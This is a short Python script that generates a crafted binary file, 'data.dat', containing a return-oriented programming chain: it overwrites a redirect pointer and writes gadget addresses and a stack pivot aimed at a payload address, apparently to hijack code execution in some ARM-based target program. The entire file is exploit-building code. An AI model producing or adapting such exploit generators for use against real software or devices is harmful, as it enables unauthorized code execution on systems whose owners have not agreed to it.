import os,sys,struct
#1bf70
size=0x127c1c
d=0x33333333
out=bytearray(size)
OFFSET=0

redirect_offs=0x1bf5c
linearmem_target=0x1574e710
pop_r4r7pc=0x100e60
pivot_args=0x244c30
pivot=0x12f6c0

PAYLOAD_ADDR=0x1579e000
POP_R1PC=0x00109d6c
POP_R0PC=0x0011a698
ROP_POPPC=0x001017b8

#0179d80c 1579d80c

def write32(offset, value):
	global out
	out[offset:offset+4]=struct.pack("<I",value)
	
def rop(value):
	global out, OFFSET
	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
	OFFSET+=4
	
def addr_convert(addr):
	c=(addr - 0x678d88) // 8
	print(hex(c))
	return c
	


for i in range(0,size-1,4):
	temp=d+(i//4)
	out[i:i+4]=struct.pack("<I",temp)
	
write32(redirect_offs, addr_convert(linearmem_target))

out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20
	
OFFSET=0x1bf90
rop(linearmem_target)
rop(pop_r4r7pc)
rop(pivot_args)
rop(pivot)
rop(POP_R0PC)
rop(PAYLOAD_ADDR)
rop(POP_R1PC)
rop(ROP_POPPC)
rop(pivot)



with open("data.dat","wb") as f:
	f.write(out)